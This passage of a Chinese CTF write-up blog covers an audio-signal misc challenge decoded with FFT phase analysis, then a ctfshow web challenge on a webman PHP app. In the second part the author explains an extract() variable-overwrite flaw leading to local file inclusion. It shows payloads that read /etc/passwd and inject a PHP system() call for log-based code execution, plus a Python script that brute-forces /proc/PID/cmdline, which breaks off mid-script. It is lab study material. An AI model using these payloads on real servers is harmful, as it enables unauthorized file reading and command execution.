是题目特有的修正逻辑</span><br><span class="line"></span><br><span class="line">oct_str = &#x27;&#x27;.join([f&#x27;&#123;(j + 4) % 8&#125;&#x27; for j in flag_list])</span><br><span class="line"></span><br><span class="line">print(f&quot;🔢 提取到的8进制数据: &#123;oct_str&#125;&quot;)</span><br><span class="line"></span><br><span class="line">6. 转成文字 Flag</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    flag_bytes = libnum.n2s(int(oct_str, 8))</span><br><span class="line">    print(&quot;\n&quot; + &quot;=&quot;*40)</span><br><span class="line">    print(&quot;🎉 恭喜！Flag 是：&quot;)</span><br><span class="line">    print(flag_bytes.decode(&#x27;utf-8&#x27;))</span><br><span class="line">    print(&quot;=&quot;*40)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&quot;解码有点小问题: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>   这边是我通过ai得到的最终解题py代码，我还是写不来的。</p>
+<p>   但这边我可以边分析边学习。</p>
+<p>   前面引入库的代码以及读取文件的代码就不需要我分析了吧，重点来到我们的算法。</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">    如果是双声道，取左声道</span><br><span class="line">    </span><br><span class="line">    if len(data.shape) &gt; 1:</span><br><span class="line">        data = data[:, 0]</span><br><span class="line">        </span><br><span class="line">    print(f&quot;✅ 读取成功！采样率: &#123;sample_rate&#125;&quot;)</span><br><span class="line"></span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&quot;❌ 读取失败: &#123;e&#125;&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>   对了这个，这个写法的由来是因为，我本来想试着用Excel搓数学模型失败后的产物。</p>
+<p>   <img src="/images/QQ20251125-203319.png" alt="alt text"></p>
+<p>   我用工具提取线性数据，但还是没有成功搞到模型，所以这边就当是一个思路的辅助。</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2. 准备变量</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line">step = sample_rate // 10  # 0.1秒切一段</span><br><span class="line"></span><br><span class="line">print(&quot;⚡️ 正在进行 FFT 相位分析...&quot;)</span><br><span class="line"></span><br><span class="line">3. 循环处理每一段</span><br><span class="line"></span><br><span class="line">for i in range(0, len(data), step):</span><br><span class="line">    window = data[i : i + step]</span><br><span class="line">    if len(window) &lt; step:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>   本身我们难以跟用代码来直接得到我们的目的，因此我们必须慢慢来，我们需要得到所有数据流，每一个数据流占0.1s。</p>
+<p>   这些数据流我们可以把它们当成一个一个的小点，所以我们要计算得到1s内有多少的数据点，然后将其除以10，得到0.1s的数据点&#x2F;</p>
+<p>   之后我们将整个音频分成含有固定数量数据点的0.1s片段。</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">--- 核心算法 (完全复现题目原意) ---</span><br><span class="line"></span><br><span class="line">这步计算是 Excel 做不到的，必须用 fft</span><br><span class="line"></span><br><span class="line">fft_res = np.fft.fft(window)</span><br><span class="line"></span><br><span class="line">取第25个频率点的相位</span><br><span class="line"></span><br><span class="line">v = np.angle(fft_res[25])</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">4. 根据相位分类 (Writeup 里的阈值)</span><br><span class="line"></span><br><span class="line">val = 7</span><br><span class="line"></span><br><span class="line">这些是相位角的阈值，不是电压</span><br><span class="line"></span><br><span class="line">thresholds = [-2.5, -1.7, -0.7, 0, 0.7, 1.5, 2.4]</span><br><span class="line"></span><br><span class="line">for t in thresholds:</span><br><span class="line">    if v &lt; t:</span><br><span class="line">        val -= 1</span><br><span class="line">flag_list.append(val)</span><br><span class="line">   </span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p>   这一步是用来确定每一组0.1s的数据流属于哪一个轨道的。</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 变换到频域 </span><br><span class="line"> fft_res 是一个复数数组，长得像 [0+0j, 1+2j, 100+50j, ...] </span><br><span class="line">数组的下标代表频率。下标0是直流电，下标1是1Hz... </span><br><span class="line"> fft_res = np.fft.fft(window)</span><br><span class="line"> 2. 锁定目标 # 为什么取 [25]？</span><br><span class="line">因为这段波在 0.1秒里震动了 25次（250Hz）。 </span><br><span class="line">经过 FFT 计算后，能量会集中在下标为 25 的那个格子里。 </span><br><span class="line">我们只关心主角，不关心其他的杂音。 </span><br><span class="line"> target_complex_number = fft_res[25] </span><br><span class="line">3. 提取相位 # 这个复数可以用向量表示。np.angle 就是算这个向量和X轴的夹角。 </span><br><span class="line">结果 v 是一个弧度值，范围是 -3.14 到 +3.14。</span><br><span class="line">v = np.angle(target_complex_number)</span><br></pre></td></tr></table></figure>
+
+<p>   这边就是完全不会的领域了。FFT 快速傅里叶变换，又是数学，大概理解就是，这个方法能够具体地得到，在这一组的0.1s 数据点，所拥有的能量，按它这边就是相位，这个就是提取这一组数据的相位，不是很好理解。</p>
+<p>   这边用ai形象一下。</p>
+<blockquote>
+<p>核心比喻：操场上的赛跑<br>想象一下：</p>
+<p>window (输入的波形数据)：这是0.1秒的一段录像。录像里有一个人在操场上跑圈（正弦波震动）。</p>
+<p>np.fft.fft (FFT变换)：这是一台**“超级分析仪”。它看完了这段录像，然后给出一份“体检报告”**。</p>
+<p>fft_res (报告结果)：这份报告里有无数行（数组），每一行对应不同的“跑圈速度”。</p>
+<p>fft_res[25]：这是报告的第25行，专门记录**“在这0.1秒内跑了25圈”**的那个人。</p>
+<p>详细拆解每一行代码</p>
+<ol>
+<li>fft_res &#x3D; np.fft.fft(window)<br>发生了什么？</li>
+</ol>
+<p>window 里是一堆杂乱的时间点数据（比如：0.1秒时的电压、0.001秒时的电压…）。这时候我们只知道“他在跑”，但不知道他跑得快慢，也不知道他从哪起跑。</p>
+<p>fft 把这些数据转换成了**“频率桶 (Bins)”**。</p>
+<p>fft_res 是一个很长的数组。</p>
+<p>fft_res[0]：存的是“不动的人”（直流分量）。</p>
+<p>fft_res[1]：存的是“在这段时间里刚好只跑了 1圈 的人”。</p>
+<p>fft_res[2]：存的是“在这段时间里刚好跑了 2圈 的人”。</p>
+<p>…</p>
+<p>fft_res[N]：存的是“跑了 N 圈的人”。</p>
+<ol start="2">
+<li>target &#x3D; fft_res[25] —— 为什么偏偏是 25？<br>这是最关键的问题。</li>
+</ol>
+<p>物理含义：</p>
+<p>我们的时间窗口是 0.1秒。</p>
+<p>下标 25 的意思是：在这个窗口（0.1秒）内，这个信号完成了 25 个完整的周期。</p>
+<p>换算一下：</p>
+<p>0.1秒跑了25圈 -&gt; 1秒钟就能跑 250圈。</p>
+<p>说明这个信号的频率是 250 Hz。</p>
+<p>怎么知道是 25 的？</p>
+<p>这是出题人设定的。在这个题目里，信号的主载波频率就是 250Hz。</p>
+<p>如果你去画图（频谱图），你会发现只有在下标 25 的位置，柱子特别高（能量最大）。其他下标（比如 10, 30, 100）里虽然也有数，但都很小，是噪音。</p>
+<p>所以我们只把“第25号选手”拎出来审问，其他人不管。</p>
+<ol start="3">
+<li>v &#x3D; np.angle(target) —— 复数与相位<br>现在我们把 fft_res[25] 这个值拎出来了。 但这个值不是一个普通的数字（比如 100），而是一个复数（比如 3 + 4j）。</li>
+</ol>
+<p>为什么要用复数？ 因为描述一个正在跑圈的人，需要两个信息：</p>
+<p>幅度 (Amplitude)：他跑得有多猛？（步子迈得有多大？信号有多强？）</p>
+<p>相位 (Phase)：录像开始的那一瞬间（0.00秒），他在跑道的哪个位置？</p>
+<p>是在起跑线（0度）？</p>
+<p>还是在半圈的位置（180度）？</p>
+<p>还是在刚出发一点点的位置（45度）？</p>
+<p>一个普通的数字（标量）没法同时记下这两个信息。复数可以！</p>
+<p>想象一个坐标系：</p>
+<p>复数 3 + 4j 就是坐标系上的点 (3, 4)。</p>
+<p>原点到(3, 4)的距离：是幅度（我们这题不关心信号强弱，所以不看距离）。</p>
+<p>原点连线与X轴的夹角：就是相位！</p>
+<p>np.angle(…) 是什么？</p>
+<p>它就是一把量角器。</p>
+<p>它测量复数点 (3, 4) 在坐标系里的角度。</p>
+<p>它告诉我们：“哦，录像开始的时候，这个人在跑道的 0.93弧度（约53度）的位置。”</p>
+</blockquote>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4. 根据相位分类 (Writeup 里的阈值)</span><br><span class="line"></span><br><span class="line">val = 7</span><br><span class="line"></span><br><span class="line">这些是相位角的阈值，不是电压</span><br><span class="line"></span><br><span class="line">thresholds = [-2.5, -1.7, -0.7, 0, 0.7, 1.5, 2.4]</span><br><span class="line"></span><br><span class="line">for t in thresholds:</span><br><span class="line">    if v &lt; t:</span><br><span class="line">        val -= 1</span><br><span class="line">flag_list.append(val)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>核心算法过了后，后面的都比较好理解了，通过相位计算属于的0-7之间的数字，然后最后得到一串八进制数据流，解码最后得到flag。</p>
+<p><strong>ctfshow{cd97fbc9-515f-496c-8c4f-d431a9ecc833}</strong></p>
+<p>总结:真是一场酣畅淋漓的学习之旅，整道题最核心的点莫过于对整个音频进行数据流的整理了，如果数据小一点，也不至于这么麻烦，我只能说misc真是大手子，轻易就干废了我。</p>
+<hr>
+<h1 id="5-迷雾重重"><a href="#5-迷雾重重" class="headerlink" title="#5.迷雾重重"></a>#5.迷雾重重</h1><p><img src="/images/QQ20251127-165313.png" alt="alt text"></p>
+<p>做这题的时候想起了之前newstar的pop链，那一题的名字叫小羊走迷宫，那是我第一次遇到pop链，用了不少ai，但没有做出来，也不知道官方环境什么时候复现，回去看看。</p>
+<p>好了好了，回到这一题来，这一题的考点两个，代码审计，加任意文件包含漏洞，其实还有点反序列化，但那是一个陷阱，卡了我两天了。</p>
+<p>题目的附件就是源码，先做的就是好好研究源码。</p>
+<p><img src="/images/QQ20251127-171343.png" alt="alt text"></p>
+<p> 压缩 一下，仔细研究这里面的好几个的php。</p>
+<p>“C:\Users\G1731\Downloads\app\app\controller\IndexController.php”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">use support\Request;</span><br><span class="line"></span><br><span class="line">use support\exception\BusinessException;</span><br><span class="line"></span><br><span class="line">class IndexController</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  public function index(Request $request)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">​    return view(&#x27;index/index&#x27;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function testUnserialize(Request $request)&#123;</span><br><span class="line"></span><br><span class="line">​    if(null !== $request-&gt;get(&#x27;data&#x27;))&#123;</span><br><span class="line"></span><br><span class="line">​      $data = $request-&gt;get(&#x27;data&#x27;);</span><br><span class="line"></span><br><span class="line">​      unserialize($data);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    return &quot;unserialize测试完毕&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function testJson(Request $request)&#123;</span><br><span class="line"></span><br><span class="line">​    if(null !== $request-&gt;get(&#x27;data&#x27;))&#123;</span><br><span class="line"></span><br><span class="line">​      $data = json_decode($request-&gt;get(&#x27;data&#x27;),true);</span><br><span class="line"></span><br><span class="line">​      if(null!== $data &amp;&amp; $data[&#x27;name&#x27;] == &#x27;guest&#x27;)&#123;</span><br><span class="line"></span><br><span class="line">​        return view(&#x27;index/view&#x27;, $data);</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    return &quot;json_decode测试完毕&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function testSession(Request $request)&#123;</span><br><span class="line"></span><br><span class="line">​    $session = $request-&gt;session();</span><br><span class="line"></span><br><span class="line">​    $session-&gt;set(&#x27;username&#x27;,&quot;guest&quot;);</span><br><span class="line"></span><br><span class="line">​    $data = $session-&gt;get(&#x27;username&#x27;);</span><br><span class="line"></span><br><span class="line">​    return &quot;session测试完毕 username: &quot;.$data;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function testException(Request $request)&#123;</span><br><span class="line"></span><br><span class="line">​    if(null != $request-&gt;get(&#x27;data&#x27;))&#123;</span><br><span class="line"></span><br><span class="line">​      $data = $request-&gt;get(&#x27;data&#x27;);</span><br><span class="line"></span><br><span class="line">​      throw new BusinessException(&quot;业务异常 &quot;.$data,3000);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    return &quot;exception测试完毕&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好几个都是框架，害得我得一个一个的查，累死了。</p>
+<p>其中令我耳目一新的就是这个php，也是这个代码害我一入反序列化不知深浅。</p>
+<p>尝试构建各种rce或者文件写入，均失败，更气人的是这题目还有设置，不回显路径，完全就不让你知道错了，然后写入文件就是404，怎么样，文件中的命令都不被执行，只能说，g。</p>
+<p>对了给一下，我利用的源代码吧，”C:\Users\G1731\Downloads\app\process\Monitor.php”，这个，将这个仔细的看来看去，也是找到能用的，虽然实际是没有成功的。</p>
+<p>真正的方向是在”C:\Users\G1731\Downloads\app\vendor\workerman\webman-framework\src\support\view\Raw.php”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"></span><br><span class="line"> * This file is part of webman.</span><br><span class="line">   *</span><br><span class="line"> * Licensed under The MIT License</span><br><span class="line"> * For full copyright and license information, please see the MIT-LICENSE.txt</span><br><span class="line"> * Redistributions of files must retain the above copyright notice.</span><br><span class="line">   *</span><br><span class="line"> * @author    walkor&lt;walkor@workerman.net&gt;</span><br><span class="line"> * @copyright walkor&lt;walkor@workerman.net&gt;</span><br><span class="line"> * @link      http://www.workerman.net/</span><br><span class="line"> * @license   http://www.opensource.org/licenses/mit-license.php MIT License</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">namespace support\view;</span><br><span class="line"></span><br><span class="line">use Throwable;</span><br><span class="line">use Webman\View;</span><br><span class="line">use function app_path;</span><br><span class="line">use function array_merge;</span><br><span class="line">use function base_path;</span><br><span class="line">use function config;</span><br><span class="line">use function extract;</span><br><span class="line">use function is_array;</span><br><span class="line">use function ob_end_clean;</span><br><span class="line">use function ob_get_clean;</span><br><span class="line">use function ob_start;</span><br><span class="line">use function request;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"></span><br><span class="line"> * Class Raw</span><br><span class="line"></span><br><span class="line"> * @package support\view</span><br><span class="line">   */</span><br><span class="line">   class Raw implements View</span><br><span class="line">   &#123;</span><br><span class="line">   /**</span><br><span class="line"></span><br><span class="line">    * Assign.</span><br><span class="line">    * @param string|array $name</span><br><span class="line">    * @param mixed $value</span><br><span class="line">      */</span><br><span class="line">      public static function assign($name, $value = null)</span><br><span class="line">      &#123;</span><br><span class="line">      $request = request();</span><br><span class="line">      $request-&gt;_view_vars = array_merge((array) $request-&gt;_view_vars, is_array($name) ? $name : [$name =&gt; $value]);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   /**</span><br><span class="line"></span><br><span class="line">    * Render.</span><br><span class="line"></span><br><span class="line">    * @param string $template</span><br><span class="line"></span><br><span class="line">    * @param array $vars</span><br><span class="line"></span><br><span class="line">    * @param string|null $app</span><br><span class="line"></span><br><span class="line">    * @param string|null $plugin</span><br><span class="line"></span><br><span class="line">    * @return false|string</span><br><span class="line">      */</span><br><span class="line">      public static function render(string $template, array $vars, string $app = null, string $plugin = null): string</span><br><span class="line">      &#123;</span><br><span class="line">      $request = request();</span><br><span class="line">      $plugin = $plugin === null ? ($request-&gt;plugin ?? &#x27;&#x27;) : $plugin;</span><br><span class="line">      $configPrefix = $plugin ? &quot;plugin.$plugin.&quot; : &#x27;&#x27;;</span><br><span class="line">      $viewSuffix = config(&quot;&#123;$configPrefix&#125;view.options.view_suffix&quot;, &#x27;html&#x27;);</span><br><span class="line">      $app = $app === null ? ($request-&gt;app ?? &#x27;&#x27;) : $app;</span><br><span class="line">      $baseViewPath = $plugin ? base_path() . &quot;/plugin/$plugin/app&quot; : app_path();</span><br><span class="line">      $__template_path__ = $app === &#x27;&#x27; ? &quot;$baseViewPath/view/$template.$viewSuffix&quot; : &quot;$baseViewPath/$app/view/$template.$viewSuffix&quot;;</span><br><span class="line"></span><br><span class="line">      if(isset($request-&gt;_view_vars)) &#123;</span><br><span class="line">          extract((array)$request-&gt;_view_vars);</span><br><span class="line">      &#125;</span><br><span class="line">      extract($vars);</span><br><span class="line">      ob_start();</span><br><span class="line">      // Try to include php file.</span><br><span class="line">      try &#123;</span><br><span class="line">          include $__template_path__;</span><br><span class="line">      &#125; catch (Throwable $e) &#123;</span><br><span class="line">          ob_end_clean();</span><br><span class="line">          throw $e;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return ob_get_clean();</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<pre><code>  public static function render(string $template, array $vars, string $app = null, string $plugin = null): string
+  {
+  $request = request();
+  $plugin = $plugin === null ? ($request-&gt;plugin ?? &#39;&#39;) : $plugin;
+  $configPrefix = $plugin ? &quot;plugin.$plugin.&quot; : &#39;&#39;;
+  $viewSuffix = config(&quot;{$configPrefix}view.options.view_suffix&quot;, &#39;html&#39;);
+  $app = $app === null ? ($request-&gt;app ?? &#39;&#39;) : $app;
+  $baseViewPath = $plugin ? base_path() . &quot;/plugin/$plugin/app&quot; : app_path();
+  $__template_path__ = $app === &#39;&#39; ? &quot;$baseViewPath/view/$template.$viewSuffix&quot; : &quot;$baseViewPath/$app/view/$template.$viewSuffix&quot;;
+
+  if(isset($request-&gt;_view_vars)) {
+      extract((array)$request-&gt;_view_vars);
+  }
+  extract($vars);
+  ob_start();
+  // Try to include php file.
+  try {
+      include $__template_path__;
+</code></pre>
+<hr>
+<p>public static function render($template, $vars, …)</p>
+<p><em><code>$__template_path__ = $app === &#39;&#39; ? ... : ...;</code></em></p>
+<p>网站框架先计算出合法的物理文件路径，比如 <code>/var/www/html/app/view/index/index.html</code>，赋值给局部变量 <code>$__template_path__</code>。</p>
+<p>*<code>extract($vars);</code>*是漏洞核心点。</p>
+<p><code>$vars</code> 是我们传入的数组。<code>extract</code> 默认配置是 <code>EXTR_OVERWRITE</code>（有同名变量直接覆盖）。</p>
+<p><em><code>include $__template_path__;</code></em>   最后包含这个路径。</p>
+<p>接下来看看内存里，假设我们构造 Payload：<code>?data={&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;/etc/passwd&quot;}</code>。</p>
+<p><code>$vars</code> 数组里就有了 <code>__template_path__</code> 这个key。</p>
+<ol>
+<li><p>代码先执行路径计算，<code>$__template_path__</code> 内存里是正常的 index.html 路径。</p>
+</li>
+<li><p>代码执行 <em><code>extract($vars)</code></em>。</p>
+<p>解析到键 <code>&quot;name&quot;</code>，创建新变量 <code>$name</code>。</p>
+<p>解析到键 <code>&quot;__template_path__&quot;</code>，发现当前作用域里已经有这个变量了。</p>
+<p>因为没加 <code>EXTR_SKIP</code>，直接无视原值，强制覆盖。</p>
+<p>此时内存里 <code>$__template_path__</code> 变成了我们注入的 <code>&quot;/etc/passwd&quot;</code>。</p>
+</li>
+<li><p>代码执行 <em><code>include</code></em>。</p>
+</li>
+<li><p>php 去读取 <code>$__template_path__</code>。</p>
+<p>读到的是被篡改后的路径，直接包含，文件覆盖就完成了。</p>
+</li>
+</ol>
+<p>但是文件覆盖了又能怎么样，不好意思，这个就很像cve了，我们完全可以弄个木马进去啊。</p>
+<p>构造 payload：<code>?data={&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;&lt;?php system(&#39;ls /&#39;);?&gt;&quot;}</code></p>
+<p>随后php就会尝试在文件系统里找一个名字叫 <code>&lt;?php system(&#39;ls /&#39;);?&gt;</code> 的文件。</p>
+<p>结果当然是找不到的，所以php代码会显示错误。</p>
+<hr>
+<pre><code>  } catch (Throwable $e) {
+      ob_end_clean();
+      throw $e;
+</code></pre>
+<hr>
+<p>根据源代码，如果报错，那这个错误就会被扔到上层。</p>
+<p><img src="/images/QQ20251127-184356.png" alt="alt text"></p>
+<p>所以最终这个错误就会被Log::error($e)捕获，保留在网站的日志中。</p>
+<p>接下来我们的目标就是找到日志所在点了。</p>
+<p>但这边我就不会了，本来学到上面的错误文件执行已经是我的极限了，后面找这个日志我是真不行。</p>
+<p>我就直接让ai给我代码了。</p>
+<pre><code>import requests
+import json
+import time
+import urllib3
+
+# 1. 基础配置
+
+# -------------------------------------------------------
+
+# 禁用 HTTPS 证书警告（CTF 题目很多是自签名证书，不禁用会满屏报错）
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# 🎯 目标 URL：请替换为你当前的题目靶机地址
+
+# 注意：必须以 / 结尾，例如 http://ip:port/
+
+TARGET_URL = &quot;https://7bad1824-e49a-4e34-9620-57039c589b0d.challenge.ctf.show/&quot;
+
+def find_webroot():
+    print(f&quot;[+] 开始扫描 PID，目标: {TARGET_URL}&quot;)
+    print(&quot;[+] 正在尝试读取 /proc/[PID]/cmdline ...&quot;)
+# 2. 爆破循环
+# -------------------------------------------------------
+# 为什么是 1 到 300？
+# 在 Docker 容器中，PID 通常很小。
+# PID 1 通常是入口进程，PID 2-20 通常是其启动的子进程。
+# 只要找到其中一个保留了原始启动命令的进程即可。
+for pid in range(1, 300):
+    
+    # 3. 构造 Payload (核心攻击点)
+    # ---------------------------------------------------
+    # 漏洞原理：变量覆盖导致 LFI
+    # 我们利用 extract($vars) 覆盖了内部变量 $__template_path__
+    # 将其指向 Linux 的进程信息文件 /proc/[PID]/cmdline
+    target_file = f&quot;/proc/{pid}/cmdline&quot;
+    
+    payload_data = {
+        &quot;name&quot;: &quot;guest&quot;,                # 满足 if(data[&#39;name&#39;] == &#39;guest&#39;) 的前置条件
+        &quot;__template_path__&quot;: target_file # 恶意的路径变量
+    }
+
+    try:
+        # 4. 发送请求
+        # -----------------------------------------------
+        # Webman 接收的是 data 参数，且需要是 JSON 字符串格式
+        r = requests.get(
+            url=TARGET_URL + &#39;index/testJson&#39;,
+            params={&quot;data&quot;: json.dumps(payload_data)}, # 自动将字典转为 JSON 字符串
+            verify=False, # 不验证 SSL 证书
+            timeout=2     # 设置超时，防止卡死
+        )
+
+        # 5. 结果分析 (特征匹配)
+        # -----------------------------------------------
+        # 我们的目标是找到启动命令，例如： &quot;php /var/www/html/app/start.php start&quot;
+        # 所以我们搜索 &quot;start.php&quot; 这个关键词。
+        if &quot;start.php&quot; in r.text:
+            print(f&quot;\n[!] 在 PID: {pid} 发现关键信息！&quot;)
+            
+            # --- 提取路径逻辑 (字符串清洗) ---
+            # 返回的内容通常混杂了 null 字节 (\x00) 或者框架的报错信息
+            # 典型返回示例: ...start_file=/var/www/html/webrooth1xaa/start.php...
+            
+            content = r.text
+            
+            # 尝试提取绝对路径
+            # 思路：找到 &quot;start.php&quot; 的位置，向左截取直到遇到路径特征
+            if &quot;start_file=&quot; in content:
+                # 这种情况通常出现在框架把变量 dump 出来的时候
+                # split 切割提取
+                temp = content.split(&quot;start_file=&quot;)[1] 
+                full_path = temp.split(&quot;.php&quot;)[0] + &quot;.php&quot;
+                
+                # 去掉文件名的部分，只留目录
+                # /var/www/html/webrooth1xaa/start.php -&gt; /var/www/html/webrooth1xaa
